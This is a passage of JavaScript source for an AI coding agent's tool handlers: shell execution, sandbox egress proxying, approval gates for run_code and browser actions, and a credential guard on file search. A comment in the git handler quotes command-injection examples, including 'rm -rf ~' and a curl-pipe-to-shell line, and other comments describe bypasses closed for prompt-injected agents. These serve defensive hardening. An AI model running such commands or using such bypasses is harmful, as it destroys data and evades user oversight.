            pluginSource: pluginBinProvenance.pluginSource,
          }
        : {};

      // Background: spawn, register, return a task_id immediately. The agent
      // polls output + completion via check_shell. No timeout — that's the whole
      // point of backgrounding (builds, test suites, dev servers).
      if (args.run_in_background === true) {
        if (sandbox) {
          return attachDescriptor({
            error:
              "[Sandbox] Background shell tasks are not supported in the ephemeral sandbox. Run in the foreground or explicitly disable --sandbox.",
            policy: { decision: "deny", via: "sandbox" },
          });
        }
        // Free memory from idle background tasks before adding another, so a
        // long agent run can't accumulate forgotten dev servers (no-op unless
        // the machine is actually under memory pressure).
        reapIdleBackgroundShellTasks();
        const id = `bg_${++_backgroundTaskSeq}`;
        const task = {
          id,
          command: args.command,
          cwd: args.cwd || cwd,
          status: "running",
          exitCode: null,
          signal: null,
          error: null,
          startedAt: new Date().toISOString(),
          lastActivityAt: Date.now(),
          endedAt: null,
          out: _newBgStream(),
          err: _newBgStream(),
          child: null,
        };
        try {
          const bgSpawnOpts = {
            cwd: task.cwd,
            shell: shellInv.useDefaultShell,
            windowsHide: true,
            // Same agent-identity env as the foreground path: CLAUDECODE marks
            // "running under the agent"; the session id correlates work to the
            // run (CC_SESSION_ID + CLAUDE_CODE_SESSION_ID for Claude-Code parity).
            // Credential proxy (opt-in, CC_CREDENTIAL_PROXY): keeps the agent's
            // real long-lived secrets out of the spawned command's env — a
            // no-op (same object) when disabled. See credential-proxy.js.
            env: applyCredentialProxy({
              ...process.env,
              CLAUDECODE: "1",
              ...(sessionId
                ? {
                    CC_SESSION_ID: String(sessionId),
                    CLAUDE_CODE_SESSION_ID: String(sessionId),
                  }
                : {}),
            }).env,
            // POSIX: own process group so check_shell{kill}/teardown can signal
            // the whole tree (shell + its grandchild command). No-op on Windows
            // where the tree is killed via taskkill /T instead.
            detached: process.platform !== "win32",
          };
          // PowerShell route: explicit argv (shell:false above); default route
          // is the historical spawn(command, {shell:true}) byte-for-byte.
          const brokerOpts = {
            ...bgSpawnOpts,
            origin: processOrigin,
            policy: "allow",
            scope: "agent",
            ...processProvenance,
          };
          const child = shellInv.useDefaultShell
            ? broker.spawn(args.command, [], brokerOpts)
            : broker.spawn(shellInv.file, shellInv.argv, brokerOpts);
          task.child = child;
          if (child.stdout) {
            child.stdout.setEncoding("utf8");
            child.stdout.on("data", (d) => {
              task.lastActivityAt = Date.now();
              _appendBgStream(task.out, d);
            });
          }
          if (child.stderr) {
            child.stderr.setEncoding("utf8");
            child.stderr.on("data", (d) => {
              task.lastActivityAt = Date.now();
              _appendBgStream(task.err, d);
            });
          }
          child.on("error", (err) => {
            task.status = "error";
            task.error = String(err?.message || err).substring(0, 2000);
            task.endedAt = new Date().toISOString();
            _releaseBgChildHandles(task);
          });
          // 'close' (not 'exit') so stdout/stderr are fully drained before the
          // status leaves "running" — otherwise a poll can observe completion
          // with the final output chunk not yet buffered.
          child.on("close", (code, signal) => {
            // 'error' may have already set a terminal state; don't overwrite it.
            if (task.status === "running") {
              task.status = code === 0 ? "exited" : "failed";
            }
            task.exitCode = code;
            task.signal = signal;
            task.endedAt = new Date().toISOString();
            _releaseBgChildHandles(task);
          });
        } catch (err) {
          task.status = "error";
          task.error = String(err?.message || err).substring(0, 2000);
          task.endedAt = new Date().toISOString();
        }
        _backgroundShellTasks.set(id, task);
        // Arm the process-exit net so a Ctrl-C / hard exit can't orphan this
        // task (the normal `finally` reaper is bypassed by signals).
        _ensureBgExitReaper();
        return attachDescriptor(
          {
            background: true,
            task_id: id,
            status: task.status,
            command: task.command,
            ...shellMeta,
            hint: "Poll output and completion with the check_shell tool using this task_id. Kill long-lived servers with check_shell { task_id, kill: true } when done.",
            shellCommandPolicy: shellPolicy,
            approval: approvalOutcome,
          },
          override || runtimeDescriptor,
        );
      }

      if (sandbox) {
        const { executeSandboxedShell, sandboxSummary } =
          await import("../lib/agent-sandbox.js");
        // Domain-restricted networking is ENFORCED by routing the sandboxed
        // process's egress through a local filtering proxy (see
        // sandbox-egress-proxy.js). Start it only when the policy actually
        // restricts domains and network is on; tear it down after the command.
        const sboxPolicy = sandbox.policy || {};
        const needsEgress =
          sandbox.network === true &&
          (sboxPolicy.allowedDomains?.length || 0) +
            (sboxPolicy.deniedDomains?.length || 0) >
            0;
        let egressProxy = null;
        let proxyHandle = null;
        if (needsEgress) {
          try {
            const { createEgressProxy } =
              await import("../lib/sandbox-egress-proxy.js");
            proxyHandle = createEgressProxy(
              {
                allowedDomains: sboxPolicy.allowedDomains || [],
                deniedDomains: sboxPolicy.deniedDomains || [],
                allowPrivate: sboxPolicy.allowPrivate === true,
              },
              { bindHost: "0.0.0.0" }, // reachable from the container/netns
            );
            const listened = await proxyHandle.listen();
            egressProxy = { port: listened.port };
          } catch {
            // If the proxy can't start, leave egressProxy null so the sandbox
            // fails closed (refuses) rather than running without enforcement.
            proxyHandle = null;
            egressProxy = null;
          }
        }
        let result;
        try {
          result = executeSandboxedShell(args.command, sandbox, {
            cwd: args.cwd || cwd,
            timeout: _resolveShellTimeout(args.timeout),
            maxBuffer: 1024 * 1024,
            egressProxy,
            env: {
              CLAUDECODE: "1",
              ...(sessionId
                ? {
                    CC_SESSION_ID: String(sessionId),
                    CLAUDE_CODE_SESSION_ID: String(sessionId),
                  }
                : {}),
            },
          });
        } finally {
          if (proxyHandle) {
            try {
              await proxyHandle.close();
            } catch {
              /* best-effort teardown */
            }
          }
        }
        const common = {
          sandbox: sandboxSummary(sandbox),
          shellCommandPolicy: shellPolicy,
          approval: approvalOutcome,
          policyTrace: ["shell-policy", "approval", "sandbox"],
        };
        if (result.exitCode !== 0) {
          return attachDescriptor(
            {
              error: (
                result.stderr ||
                `Sandbox command exited with code ${result.exitCode}`
              ).substring(0, 2000),
              stdout: result.stdout.substring(0, 30000),
              stderr: result.stderr.substring(0, 2000),
              exitCode: result.exitCode,
              ...common,
            },
            override || runtimeDescriptor,
          );
        }
        return attachDescriptor(
          { stdout: result.stdout.substring(0, 30000), ...common },
          override || runtimeDescriptor,
        );
      }

      try {
        const fgExecOpts = {
          cwd: args.cwd || cwd,
          encoding: "utf8",
          timeout: _resolveShellTimeout(args.timeout),
          maxBuffer: 1024 * 1024,
          // Agent-identity env for shell subprocesses (Claude-Code 2.1.132
          // parity): CLAUDECODE=1 marks "running under the agent"; CC_SESSION_ID
          // + its CLAUDE_CODE_SESSION_ID mirror let scripts/hooks correlate work
          // to the agent session (the mirror is what CC-targeting tools expect).
          // Credential proxy (opt-in, CC_CREDENTIAL_PROXY): keeps the agent's
          // real long-lived secrets out of the shell's env — a no-op (same
          // object) when disabled. See credential-proxy.js.
          env: applyCredentialProxy({
            ...process.env,
            CLAUDECODE: "1",
            ...(sessionId
              ? {
                  CC_SESSION_ID: String(sessionId),
                  CLAUDE_CODE_SESSION_ID: String(sessionId),
                }
              : {}),
          }).env,
        };
        let output;
        const brokerExecOpts = {
          ...fgExecOpts,
          origin: processOrigin,
          policy: "allow",
          scope: "agent",
          ...processProvenance,
        };
        if (shellInv.useDefaultShell) {
          output = broker.execSync(args.command, brokerExecOpts);
        } else {
          // PowerShell route: explicit argv, no intermediate default shell.
          // Reproduce execSync's contract so the shared catch shapes errors
          // identically: throw on spawn error; throw an Error carrying
          // status/stdout/stderr on non-zero exit.
          const res = broker.spawnSync(shellInv.file, shellInv.argv, {
            ...brokerExecOpts,
            windowsHide: true,
          });
          if (res.error) throw res.error;
          if (res.status !== 0) {
            const e = new Error(
              `Command failed (${shellInv.kind}, exit ${res.status}): ${args.command}`,
            );
            e.status = res.status;
            e.stdout = res.stdout;
            e.stderr = res.stderr;
            throw e;
          }
          output = res.stdout ?? "";
        }
        // PR/session linking (gap-2026-07-11 P1#9): a successful `gh pr …`
        // (or `git push`) ties this session to the PR it touched. Async and
        // best-effort — never delays or fails the tool result.
        if (sessionId) {
          import("../lib/pr-link-ledger.js")
            .then((m) =>
              m.recordFromShellCommand({
                sessionId,
                command: args.command,
                output: String(output || ""),
                cwd: args.cwd || cwd,
              }),
            )
            .catch(() => {});
        }
        return attachDescriptor(
          {
            stdout: output.substring(0, 30000),
            ...shellMeta,
            shellCommandPolicy: shellPolicy,
            approval: approvalOutcome,
          },
          override || runtimeDescriptor,
        );
      } catch (err) {
        return attachDescriptor(
          {
            error: err.message.substring(0, 2000),
            // Surface stdout too: a failing command (test runner / linter /
            // build) usually prints WHAT failed to stdout and only the summary
            // to stderr, so dropping it on non-zero exit blinds the agent to the
            // actual failure. Only attach it when there IS output (a timeout with
            // no output keeps the field absent), mirroring the success path.
            ...(err.stdout
              ? { stdout: String(err.stdout).substring(0, 30000) }
              : {}),
            stderr: (err.stderr || "").substring(0, 2000),
            exitCode: err.status,
            ...shellMeta,
            shellCommandPolicy: shellPolicy,
            approval: approvalOutcome,
          },
          override || runtimeDescriptor,
        );
      }
    }

    case "check_shell": {
      const taskId = args.task_id;
      // No task_id → list known background tasks (lightweight status surface).
      if (!taskId) {
        return attachDescriptor({
          tasks: listBackgroundShellTasks(),
        });
      }
      const task = _backgroundShellTasks.get(taskId);
      if (!task) {
        return attachDescriptor({
          error: `No background shell task with id "${taskId}".`,
          tasks: listBackgroundShellTasks(),
        });
      }
      let killed = false;
      if (args.kill === true) {
        // _killTask signals the whole process tree (see its doc); the close
        // handler flips status. Best-effort.
        killed = _killTask(task);
      }
      const out = _readBgStream(task.out);
      const err = _readBgStream(task.err);
      return attachDescriptor({
        task_id: task.id,
        status: task.status,
        running: task.status === "running",
        command: task.command,
        exitCode: task.exitCode,
        signal: task.signal,
        ...(task.error ? { error: task.error } : {}),
        stdout: out.text.substring(0, 30000),
        stderr: err.text.substring(0, 30000),
        ...(out.droppedGap ? { stdout_dropped_bytes: out.droppedGap } : {}),
        ...(err.droppedGap ? { stderr_dropped_bytes: err.droppedGap } : {}),
        ...(killed ? { killed: true } : {}),
        startedAt: task.startedAt,
        endedAt: task.endedAt,
      });
    }

    case "git": {
      const normalizedCommand = normalizeGitCommand(args.command);
      if (!normalizedCommand) {
        return attachDescriptor({
          error: "Git command is required.",
        });
      }

      // Run via argv (spawnSync, NO shell) so shell metacharacters in the
      // command — e.g. `status; rm -rf ~`, `log && curl evil|sh`, `$(…)` —
      // cannot inject a second command. Previously execSync(`git ${cmd}`) ran
      // the whole string through a shell, and the destructive-git/credential/
      // run_shell guards only inspect the first token, so this was an arbitrary
      // command-execution bypass for a prompt-injected agent. Quoted args (a
      // commit message) keep their content via the quote-aware tokenizer.
      const gitArgs = tokenizeShellWords(normalizedCommand);
      const res = spawnSync("git", gitArgs, {
        cwd: args.cwd || cwd,
        encoding: "utf8",
        timeout: 60000,
        maxBuffer: 1024 * 1024,
        windowsHide: true,
      });
      const readOnly = isReadOnlyGitCommand(normalizedCommand);
      if (res.error) {
        return attachDescriptor({
          error: String(res.error.message || res.error).substring(0, 2000),
          command: normalizedCommand,
          readOnly,
        });
      }
      if (res.status !== 0) {
        const stderr = String(res.stderr || "").substring(0, 2000);
        return attachDescriptor({
          error: stderr || `git exited with code ${res.status}`,
          stderr,
          exitCode: res.status,
          command: normalizedCommand,
          readOnly,
        });
      }
      return attachDescriptor({
        stdout: String(res.stdout || "").substring(0, 30000),
        command: normalizedCommand,
        readOnly,
      });
    }

    case "run_code": {
      // run_code executes arbitrary python/node/bash — strictly more powerful
      // than run_shell — yet historically ran ungated. In an INTERACTIVE
      // session (interactiveApproval) it now honors the same ApprovalGate tier
      // as run_shell so a strict-tier session prompts before arbitrary code
      // runs (closing the bypass where `run_code` could `rm -rf` / rmtree past
      // the run_shell gate). A settings `allow` rule (ruleAllowed) pre-
      // authorizes; headless leaves interactiveApproval false so its existing
      // per-permission-mode behavior is unchanged.
      //
      // A spawned sub-agent gets a dedicated CONFIRMER-LESS ApprovalGate for a
      // strict/trusted mode (2026-07-13). It has no human to prompt, so gate
      // run_code under it too — decide() auto-denies CONFIRM via no-confirmer,
      // enforcing the tier on arbitrary code exactly like run_shell/browser_act
      // (which already gate whenever an approvalGate is present). This is the
      // child's gate specifically: the main headless + REPL gates ALWAYS carry a
      // confirmer, so `!hasConfirmer()` leaves them byte-identical.
      const policyGateNoConfirmer =
        approvalGate &&
        typeof approvalGate.hasConfirmer === "function" &&
        !approvalGate.hasConfirmer();
      if (
        (interactiveApproval || policyGateNoConfirmer) &&
        approvalGate &&
        !ruleAllowed &&
        typeof approvalGate.decide === "function"
      ) {
        const { APPROVAL_RISK, APPROVAL_DECISION } =
          await import("@chainlesschain/session-core");
        const gate = await approvalGate.decide({
          sessionId,
          riskLevel: APPROVAL_RISK.HIGH,
          tool: "run_code",
          args: { language: args.language },
        });
        if (gate.decision !== APPROVAL_DECISION.ALLOW) {
          // Actionable denial (matches run_shell, Claude-Code 2.1.193): tell the
          // model retrying won't help and to involve the user.
          const tierLabel =
            typeof gate.policy === "string" ? `"${gate.policy}" ` : "";
          return attachDescriptor({
            error: `[ApprovalGate] run_code denied by the ${tierLabel}approval policy (via ${gate.via}). Retrying won't help — running arbitrary code needs user approval. Tell the user (they can approve it or relax the policy) and continue with other work.`,
            approval: {
              decision: gate.decision,
              via: gate.via,
              riskLevel: "high",
              policy: gate.policy,
            },
          });
        }
      }
      return attachDescriptor(await _executeRunCode(args, cwd));
    }

    case "spawn_sub_agent": {
      return attachDescriptor(
        await _executeSpawnSubAgent(args, {
          skillLoader,
          cwd,
          parentMessages,
          interaction,
          sessionId,
          llmOptions,
          subAgentDepth,
          subAgentBudget,
          subAgentContract,
          settingsHooks,
          // Parent trace for the child's hook envelopes (parent_id).
          hookTraceId,
          // Parent MCP plumbing — a spawn can inherit these into the child,
          // filtered by the resolved contract's mcpServers allow-list.
          mcpClient,
          externalToolDescriptors,
          externalToolExecutors,
          extraToolDefinitions,
          // Parent memory — inherited into the child only when contract grants it.
          memoryDb,
          permanentMemory,
          signal,
          backgroundSubAgents,
          subAgentUsageSink,
          toolAdmission,
        }),
      );
    }

    case "web_fetch": {
      try {
        const { webFetch } = await import("../lib/web-fetch.js");
        let webFetchConfig = {};
        try {
          const { loadProjectConfig: _lpc, findProjectRoot: _fpr } =
            await import("../lib/project-detector.js");
          const projectRoot = _fpr(cwd);
          if (projectRoot) {
            const cfg = _lpc(projectRoot);
            webFetchConfig = cfg?.webFetch || {};
          }
        } catch (_err) {
          // Config optional — use defaults
        }
        const result = await webFetch(args.url, {
          format: args.format,
          maxBytes: args.maxBytes,
          timeout: args.timeout,
          config: webFetchConfig,
        });
        return attachDescriptor(result);
      } catch (err) {
        return attachDescriptor({ error: `web_fetch failed: ${err.message}` });
      }
    }

    case "web_search": {
      try {
        const { webSearch } = await import("../lib/web-search.js");
        let webSearchConfig = {};
        try {
          const { loadProjectConfig: _lpc, findProjectRoot: _fpr } =
            await import("../lib/project-detector.js");
          const projectRoot = _fpr(cwd);
          if (projectRoot) {
            const cfg = _lpc(projectRoot);
            webSearchConfig = cfg?.webSearch || {};
          }
        } catch (_err) {
          // Config optional — use defaults (auto provider / keyless fallback)
        }
        const result = await webSearch(args.query, {
          provider: args.provider,
          maxResults: args.maxResults,
          timeout: args.timeout,
          config: webSearchConfig,
        });
        return attachDescriptor(result);
      } catch (err) {
        return attachDescriptor({ error: `web_search failed: ${err.message}` });
      }
    }

    case "todo_write": {
      try {
        const { writeTodos } = await import("../lib/todo-manager.js");
        const result = writeTodos(sessionId, args.todos);
        if (!result.success) {
          return attachDescriptor({ error: result.error });
        }
        return attachDescriptor({
          success: true,
          count: result.count,
          summary: result.summary,
        });
      } catch (err) {
        return attachDescriptor({ error: `todo_write failed: ${err.message}` });
      }
    }

    case "slash_command": {
      try {
        const { getCommand, expandCommand, discoverCommands } =
          await import("../lib/slash-commands.js");
        const raw = String(args.command || "").trim();
        if (!raw) {
          return attachDescriptor({
            error: "slash_command requires a non-empty 'command'.",
          });
        }
        // Parse "/name arg1 arg2" exactly like a typed slash command (leading
        // '/' optional). First token is the command name, the rest are args.
        const [head, ...rest] = raw.replace(/^\//, "").split(/\s+/);
        const macro = head ? getCommand(head, cwd) : null;
        if (!macro) {
          const available = discoverCommands(cwd).map((c) => ({
            name: c.name,
            scope: c.scope,
            description: c.description || undefined,
          }));
          return attachDescriptor({
            error: `Unknown slash command "${head}".`,
            availableCommands: available,
            hint:
              available.length === 0
                ? "No user-defined slash commands found in .claude/commands/ or .chainlesschain/commands/."
                : "Call slash_command with one of availableCommands[].name.",
          });
        }
        // allowBang:false — the agent must not get an un-gated shell side
        // channel via a command file. $ARGUMENTS / @file (read) still expand;
        // any !`cmd` is left literal for the model to run via run_shell.
        const { prompt: expanded, warnings } = expandCommand(
          macro,
          rest.filter(Boolean),
          { cwd, allowBang: false },
        );
        return attachDescriptor({
          command: macro.name,
          scope: macro.scope,
          expandedPrompt: expanded,
          warnings: warnings && warnings.length ? warnings : undefined,
          instructions:
            "The expandedPrompt is the command's instructions. Carry them out " +
            "now using your normal tools.",
        });
      } catch (err) {
        return attachDescriptor({
          error: `slash_command failed: ${err.message}`,
        });
      }
    }

    case "ask_user_question": {
      if (!interaction || typeof interaction.askUser !== "function") {
        return attachDescriptor({
          error: "user_not_reachable",
          hint: "Non-interactive context (headless/gateway). Proceed autonomously using best judgement.",
        });
      }
      try {
        const answer = await interaction.askUser({
          question: args.question,
          options: Array.isArray(args.options) ? args.options : null,
          multiSelect: args.multiSelect === true,
          timeoutMs:
            typeof args.timeoutMs === "number" ? args.timeoutMs : 60000,
          sessionId,
        });
        return attachDescriptor({ answer });
      } catch (err) {
        if (err && err.code === "USER_TIMEOUT") {
          return attachDescriptor({
            error: "user_timeout",
            hint: "User did not respond in time. Proceed with best judgement.",
          });
        }
        return attachDescriptor({
          error: `ask_user_question failed: ${err.message}`,
        });
      }
    }

    case "search_sessions": {
      try {
        const { SessionSearchIndex } = await import("../lib/session-search.js");
        const { bootstrap } = await import("./bootstrap.js");
        const ctx = await bootstrap({ verbose: false });
        if (!ctx.db) {
          return attachDescriptor({
            error: "Database not available for session search",
          });
        }
        const index = new SessionSearchIndex(ctx.db);
        index.ensureTables();
        const results = index.search(args.query, {
          limit: args.limit || 10,
        });
        return attachDescriptor({
          query: args.query,
          results,
          count: results.length,
        });
      } catch (err) {
        return attachDescriptor({
          error: `Session search failed: ${err.message}`,
        });
      }
    }

    case "notify": {
      try {
        const { sendAgentNotification } =
          await import("../lib/agent-notify.js");
        const outcome = await sendAgentNotification({
          title: args.title,
          body: args.body,
          level: args.level,
        });
        return attachDescriptor(outcome);
      } catch (err) {
        return attachDescriptor({ error: `notify failed: ${err.message}` });
      }
    }

    case "schedule": {
      try {
        const { AgentScheduleStore } =
          await import("../lib/agent-schedule-store.js");
        const { parseDuration } = await import("../lib/loop.js");
        const store = new AgentScheduleStore();
        const action = String(args.action || "").toLowerCase();
        // Optional lifecycle knobs shared by all create actions: `expires` is a
        // duration after which an un-fired entry retires (never re-fires); `jitter`
        // is a per-entry spread so tasks sharing a cron minute fan out instead of
        // firing as a thundering herd.
        const expiresInMs = args.expires ? parseDuration(args.expires) : null;
        const jitterMs = args.jitter ? parseDuration(args.jitter) : 0;
        // Optional per-task execution policy for wakeup/cron: the scheduled run
        // can carry its OWN permission mode, worktree isolation and turn budget
        // instead of inheriting whatever ambient env `cc agenda run` runs in.
        // The store validates/drops each field; monitors ignore it.
        const runPolicy = {
          permissionMode: args.permission_mode || null,
          worktree: args.worktree === true,
          maxTurns: args.max_turns ?? null,
          goalCondition: args.goal_condition || null,
          maxOuterTurns: args.max_outer_turns ?? null,
          goalMaxTokens: args.goal_max_tokens ?? null,
          goalMaxCost: args.goal_max_cost ?? null,
          goalMaxTime: args.goal_max_time ?? null,
          // P1-8: action classes this unattended task may still perform (e.g.
          // "publish", "external_message"). Accepts an array or a comma list.
          unattendedAllowlist: Array.isArray(args.unattended_allow)
            ? args.unattended_allow
            : typeof args.unattended_allow === "string"
              ? args.unattended_allow
                  .split(",")
                  .map((s) => s.trim())
                  .filter(Boolean)
              : null,
        };
        if (action === "wakeup") {
          if (!args.prompt) {
            return attachDescriptor({
              error: "schedule wakeup requires a prompt",
            });
          }
          const delayMs = args.delay ? parseDuration(args.delay) : 0;
          const entry = store.scheduleWakeup({
            prompt: args.prompt,
            delayMs,
            label: args.label || null,
            expiresInMs,
            jitterMs,
            ...runPolicy,
          });
          return attachDescriptor({
            scheduled: entry,
            hint: "Run `cc agenda run` (e.g. via cron or `cc loop`) to fire due entries.",
          });
        }
        if (action === "cron") {
          if (!args.prompt || !args.cron) {
            return attachDescriptor({
              error: "schedule cron requires a prompt and a cron expression",
            });
          }
          const entry = store.createCron({
            prompt: args.prompt,
            cron: args.cron,
            label: args.label || null,
            expiresInMs,
            jitterMs,
            ...runPolicy,
          });
          return attachDescriptor({ scheduled: entry });
        }
        if (action === "monitor") {
          if (!args.command) {
            return attachDescriptor({
              error: "schedule monitor requires a command",
            });
          }
          const intervalMs = args.interval
            ? parseDuration(args.interval)
            : 60000;
          const entry = store.createMonitor({
            command: args.command,
            intervalMs,
            stopWhen: args.stop_when || null,
            notify: args.notify_title ? { title: args.notify_title } : null,
            maxChecks: args.max_checks ?? null,
            label: args.label || null,
            expiresInMs,
            jitterMs,
          });
          return attachDescriptor({ scheduled: entry });
        }
        if (action === "list") {
          return attachDescriptor({ entries: store.list() });
        }
        if (action === "cancel") {
          if (!args.id) {
            return attachDescriptor({
              error: "schedule cancel requires an id",
            });
          }
          const removed = store.cancel(args.id);
          return attachDescriptor({
            cancelled: removed ? removed.id : null,
            found: Boolean(removed),
          });
        }
        return attachDescriptor({
          error: `unknown schedule action "${args.action}". Valid: wakeup, cron, monitor, list, cancel.`,
        });
      } catch (err) {
        return attachDescriptor({ error: `schedule failed: ${err.message}` });
      }
    }

    case "publish_artifact": {
      // P1 #10: copy a finished deliverable into the user's artifact store.
      // Only METADATA returns to the conversation (the transcript never
      // carries the file body); `cc artifacts` lists/inspects/cleans.
      try {
        const { ArtifactStore } = await import("../lib/artifact-store.js");
        const store = new ArtifactStore();
        const entry = store.publish({
          filePath: path.resolve(cwd, String(args.path || "")),
          title: args.title,
          kind: args.kind,
          ttlDays: args.ttl_days,
          sessionId: sessionId ? String(sessionId) : null,
        });
        return attachDescriptor({
          published: entry,
          hint: "The user can browse this with `cc artifacts list` / `cc artifacts show <id>`.",
        });
      } catch (err) {
        return attachDescriptor({
          error: `publish_artifact failed: ${err.message}`,
        });
      }
    }

    case "browser_state": {
      // P1 #8: first-class Chrome CDP observation — the agent side of the
      // "locate error → fix → verify" web loop against the user's real,
      // logged-in browser (`cc browse chrome launch`). DOM is capped harder
      // than the CLI command's 150k default so a page dump cannot flood the
      // conversation; screenshots go to a generated temp file (never an
      // agent-chosen path) to keep the tool strictly read-only.
      try {
        const { captureState } = await import("../lib/chrome-connector.js");
        const screenshotPath = args.screenshot
          ? path.join(os.tmpdir(), `cc-browser-state-${Date.now()}.png`)
          : null;
        const state = await captureState({
          port: args.port != null ? Number(args.port) : undefined,
          tab: args.tab != null ? Number(args.tab) : undefined,
          reload: args.reload === true,
          watchMs: args.watch_ms != null ? Number(args.watch_ms) : undefined,
          includeDom: args.include_dom !== false,
          domCap: args.dom_cap != null ? Number(args.dom_cap) : 40000,
          screenshotPath,
        });
        if (!state.ok) {
          return attachDescriptor({
            error: `browser_state failed: ${state.error}`,
          });
        }
        return attachDescriptor(state);
      } catch (err) {
        return attachDescriptor({
          error: `browser_state failed: ${err.message}`,
        });
      }
    }

    case "browser_act": {
      // Gap-analysis #6: the ACTION side of the Chrome connector.
      // browser_state stays the read-only default; browser_act explicitly
      // drives the user's logged-in browser (click/type/press/navigate/
      // waitForSelector/screenshot/assertText) and is gated like run_code:
      // HIGH risk through the ApprovalGate (CONFIRM even on the trusted/auto
      // tier), pre-authorizable only by an explicit settings allow rule
      // (ruleAllowed). Unlike run_code there is no legacy ungated behavior to
      // preserve, so the gate applies whenever an ApprovalGate is wired —
      // headless without a confirmer fails closed. Screenshot paths are
      // generated inside performActions (never agent-chosen), and each
      // executed step is audit-logged to ~/.chainlesschain/browser-actions/.
      try {
        if (
          approvalGate &&
          !ruleAllowed &&
          typeof approvalGate.decide === "function"
        ) {
          const { APPROVAL_RISK, APPROVAL_DECISION } =
            await import("@chainlesschain/session-core");
          const summary = Array.isArray(args.actions)
            ? args.actions
                .map((a) => a?.type)
                .filter(Boolean)
                .slice(0, 10)
                .join(",")
            : "";
          const gate = await approvalGate.decide({
            sessionId,
            riskLevel: APPROVAL_RISK.HIGH,
            tool: "browser_act",
            args: { actions: summary },
          });
          if (gate.decision !== APPROVAL_DECISION.ALLOW) {
            const tierLabel =
              typeof gate.policy === "string" ? `"${gate.policy}" ` : "";
            return attachDescriptor({
              error: `[ApprovalGate] browser_act denied by the ${tierLabel}approval policy (via ${gate.via}). Retrying won't help — driving the user's browser needs their approval. Tell the user (they can approve it or relax the policy) and continue with other work.`,
              approval: {
                decision: gate.decision,
                via: gate.via,
                riskLevel: "high",
                policy: gate.policy,
              },
            });
          }
        }
        const { performActions } = await import("../lib/chrome-connector.js");
        const result = await performActions(args.actions, {
          port: args.port != null ? Number(args.port) : undefined,
          cdpUrl: args.cdp_url != null ? String(args.cdp_url) : null,
          tab: args.tab != null ? Number(args.tab) : undefined,
          continueOnError: args.continue_on_error === true,
          sessionId: sessionId ? String(sessionId) : null,
        });
        if (!result.ok && result.error) {
          // Nothing ran (validation / attach failure) — surface as an error.
          // A step-level failure returns the per-step outcomes instead so the
          // model can see exactly which step broke.
          return attachDescriptor({
            error: `browser_act failed: ${result.error}`,
          });
        }
        return attachDescriptor(result);
      } catch (err) {
        return attachDescriptor({
          error: `browser_act failed: ${err.message}`,
        });
      }
    }

    case "search_files": {
      // An explicit directory scopes the search to one root; otherwise span
      // cwd plus any --add-dir roots so cross-package searches find matches.
      const extraRoots = Array.isArray(additionalDirectories)
        ? additionalDirectories.filter(Boolean)
        : [];
      const roots = args.directory
        ? [path.resolve(cwd, args.directory)]
        : [cwd, ...extraRoots];
      const isContent = Boolean(args.content_search);
      // Pattern is model/user-supplied and flows into a shell — build the
      // command with it SAFELY quoted (see search-command.js). Raw interpolation
      // here was a command-injection bypass of the run_shell guards.
      const built = buildSearchCommand({ pattern: args.pattern, isContent });
      if (built.error) {
        return attachDescriptor({ error: built.error });
      }
      const cmd = built.cmd;

      // Credential guard (Claude-Code 2.1.189 parity): a CONTENT search must not
      // become a side channel that exfils secrets the read_file / run_shell
      // guards already block. Windows `findstr /n` embeds the matching LINE
      // (e.g. `API_KEY=…` from a .env); POSIX `grep -l` returns only names. Any
      // hit whose source is a credential file is redacted to an existence-only
      // marker — the agent must read_file (confirm-gated) to view it.
      const { credentialFileReason } = isContent
        ? await import("../lib/credential-guard.js")
        : { credentialFileReason: () => null };

      const hits = [];
      const seen = new Set();
      const redactedCreds = new Set();
      for (const root of roots) {
        if (hits.length >= 20) break;
        const ictx = {
          isContent,
          root,
          multiRoot: roots.length > 1,
          seen,
          hits,
          redactedCreds,
          credentialFileReason,
        };
        try {
          if (!fs.existsSync(root)) continue;
          const output = execSync(cmd, {
            cwd: root,
            encoding: "utf8",
            timeout: 10000,
            // Windows `findstr`/`dir /s` have no `head` cap (unlike the POSIX
            // `| head -20`), so a large tree can blow past execSync's 1 MB
            // default and throw ENOBUFS. Give it real headroom AND salvage the
            // partial below — otherwise a busy repo silently reports "no matches".
            maxBuffer: 8 * 1024 * 1024,
          });
          _ingestSearchOutput(output, ictx);
        } catch (err) {
          // A maxBuffer overflow still carries the first 8 MB of matches in
          // err.stdout — ingest those rather than dropping every hit as a false
          // "No matches found". A genuine no-match / command failure leaves
          // err.stdout empty, so hits stay unchanged (same as before).
          if (err && err.stdout) _ingestSearchOutput(err.stdout, ictx);
        }
      }

      // One existence-only marker per credential file (never its contents).
      for (const f of redactedCreds) {
        if (hits.length >= 20) break;
        hits.push(
          `<credential file ${f}: matches redacted — use read_file (requires confirmation) to view>`,
        );
      }

      if (hits.length === 0) {
        return attachDescriptor({ files: [], message: "No matches found" });
      }
      return attachDescriptor(isContent ? { matches: hits } : { files: hits });
    }

    case "code_intelligence": {
      const action = String(args.action || "").trim();
      const positionActions = new Set([
        "definition",
        "references",
        "hover",
        "rename_preview",
      ]);
      // Validate up front so the model gets a precise correction instead of a
      // cryptic crash deep in the LSP layer.
      if (action !== "workspace_symbols" && !args.file) {
        return attachDescriptor({
          error: `code_intelligence action "${action}" requires "file".`,
        });
      }
      if (
        positionActions.has(action) &&
        (args.line == null || args.col == null)
      ) {
        return attachDescriptor({
          error: `code_intelligence action "${action}" requires 1-based "line" and "col".`,
        });
      }
      if (action === "workspace_symbols" && !args.query) {
        return attachDescriptor({
          error: `code_intelligence action "workspace_symbols" requires "query".`,
        });
      }
      if (action === "rename_preview" && !args.new_name) {
        return attachDescriptor({
          error: `code_intelligence action "rename_preview" requires "new_name".`,
        });
      }
      // Multi-root workspace (P2 LSP): key the shared server pool on the root
      // that actually CONTAINS the file — a file inside an `--add-dir` root
      // gets that project's language server, not the cwd's. Single-root
      // sessions resolve to cwd exactly as before (byte-identical).
      const file = args.file ? path.resolve(cwd, args.file) : null;
      const wsRoots = workspaceRootsFor(cwd, additionalDirectories);
      const ci = await _getSharedCodeIntel(
        file ? pickRootForFile(file, wsRoots) : cwd,
      );
      let res;
      try {
        switch (action) {
          case "definition":
            res = await ci.definition(file, args.line, args.col);
            break;
          case "references":
            res = await ci.references(file, args.line, args.col);
            break;
          case "hover":
            res = await ci.hover(file, args.line, args.col);
            break;
          case "document_symbols":
            res = await ci.documentSymbols(file);
            break;
          case "workspace_symbols": {
            // Fan out across EVERY workspace root and merge — symbols from an
            // --add-dir project are stamped with their `root` so same-named
            // symbols stay unambiguous. One root → the exact legacy call.
            if (wsRoots.length > 1) {
              const perRoot = [];
